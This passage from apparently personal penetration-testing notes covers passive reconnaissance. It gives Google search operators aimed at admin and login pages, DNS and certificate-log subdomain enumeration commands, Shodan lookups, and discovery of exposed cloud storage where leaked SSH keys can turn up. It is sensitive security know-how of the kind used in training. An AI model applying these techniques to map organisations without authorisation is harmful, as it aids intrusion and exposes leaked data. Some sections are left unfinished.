| `allintext:`            | Finds pages containing all specified words in the body text. | `allintext:admin password reset`                    | Search for pages containing both "admin" and "password reset" in the body text. |
| `allinurl:`             | Finds pages containing all specified words in the URL.       | `allinurl:admin panel`                              | Look for pages with "admin" and "panel" in the URL.          |
| `allintitle:`           | Finds pages containing all specified words in the title.     | `allintitle:confidential report 2023`               | Search for pages with "confidential," "report," and "2023" in the title. |
| `AND`                   | Narrows results by requiring all terms to be present.        | `site:example.com AND (inurl:admin OR inurl:login)` | Find admin or login pages specifically on example.com.       |
| `OR`                    | Broadens results by including pages with any of the terms.   | `"linux" OR "ubuntu" OR "debian"`                   | Search for webpages mentioning Linux, Ubuntu, or Debian.     |
| `NOT`                   | Excludes results containing the specified term.              | `site:bank.com NOT inurl:login`                     | Find pages on bank.com excluding login pages.                |
| `*` (wildcard)          | Represents any character or word.                            | `site:socialnetwork.com filetype:pdf user* manual`  | Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. |
| `..` (range search)     | Finds results within a specified numerical range.            | `site:ecommerce.com "price" 100..500`               | Look for products priced between 100 and 500 on an e-commerce website. |
| `" "` (quotation marks) | Searches for exact phrases.                                  | `"information security policy"`                     | Find documents mentioning the exact phrase "information security policy". |
| `-` (minus sign)        | Excludes terms from the search results.                      | `site:news.com -inurl:sports`                       | Search for news articles on news.com excluding sports-related content. |

## Domains

#### DNS Subdomains

1. Manual search:

   - **SSL certificate**

   - **DNS records** (public domain)

     To display all the available DNS records:

     ```bash
     dig any [DOMAIN]
     ```

     The records output will be divided in categories:

     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.

   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database. FOr a deeper search: [Censys](https://search.censys.io/)

     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.

     To look them up from the terminal and filter by unique subdomains:

     ```bash
      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
     ```

     Then one can grep the ones with an IP address:

     ```bash
     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
     ```

     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.

     ```bash
     for i in $(cat ip-addresses.txt);do shodan host $i;done
     ```

     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 

   - `WHOIS` (public)

     ```bash
     whois [DOMAIN]
     ```

   - [Wayback Machine](https://web.archive.org/)

     It allows users to "go back in time" and view snapshots of websites as they appeared at various points in their history.

   - Generic Domain Data

     - [Recon-ng](https://github.com/lanmaster53/recon-ng): 


       - [theHarvester](https://github.com/laramies/theHarvester): 


       - [SpiderFoot](https://github.com/smicallef/spiderfoot): 


       - [OSINT Framework](https://osintframework.com/): 

## Cloud Assets

#### Cloud

`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 

- DNS enumeration:

  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 

- Google search:

- Third-party providers 

  -  [domain.glass](https://domain.glass) 
  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
  -  
